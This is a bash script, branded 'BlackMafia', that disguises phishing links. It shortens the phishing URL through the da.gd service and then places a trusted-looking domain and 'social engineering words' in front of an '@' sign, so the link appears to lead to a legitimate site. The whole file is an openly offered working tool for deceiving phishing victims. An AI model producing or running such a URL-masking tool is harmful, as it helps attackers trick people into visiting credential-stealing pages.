# Bash Script for Hide Phishing URL Created by BlackMafia

url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
            exit 1
        fi
    fi
}

echo -e "\e[35m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗\e[0m"
echo -e "\e[35m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝\e[0m"
echo -e "\e[35m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░\e[0m"
echo -e "\e[35m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░\e[0m"
echo -e "\e[35m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗\e[0m"
echo -e "\e[35m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝\e[0m"
echo -e "\e[35m███╗░░░███╗░█████╗░███████╗██╗░█████╗░\e[0m"
echo -e "\e[35m████╗░████║██╔══██╗██╔════╝██║██╔══██╗\e[0m"
echo -e "\e[35m██╔████╔██║███████║█████╗░░██║███████║\e[0m"
echo -e "\e[35m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║\e[0m"
echo -e "\e[35m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║\e[0m"
echo -e "\e[35m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝\e[0m"
echo -e "\e[35m------ Your Mind is Your Best Weapon------\e[0m"
echo -e "\e[1;36;42m         Phishing URL Editor          \e[0m \n"
echo -n "Paste Phishing URL here (with http or https):"
read phish
url_checker $phish
short=$(curl -s https://da.gd/s/?url=${phish})
shorter=${short#https://}
echo -e "\n\e[1;32;42m           Making Domain            \e[0m"
echo 'Domain to Make the Phishing URL (with http or https), ex https://google.com, http
://anything.org) :'
echo -en "\e[32m=>\e[0m "
read mask
url_checker $mask
echo -e '\n\e[1;33;42mType social engineering words:(like free-money, best-pubg-tricks)'
echo -e "\e[31mDon't use space just use '-' between social engineering words\e[0m"
echo -en "\e[32m==>\e[35m "
read words
echo -e "\n\e[1;34;42m        Generating Phish Link...       \n"
final=$mask-$words@$shorter
echo -e "\e[33mHere is the Phish URL:\e[35m ${final} \e[0m\n"
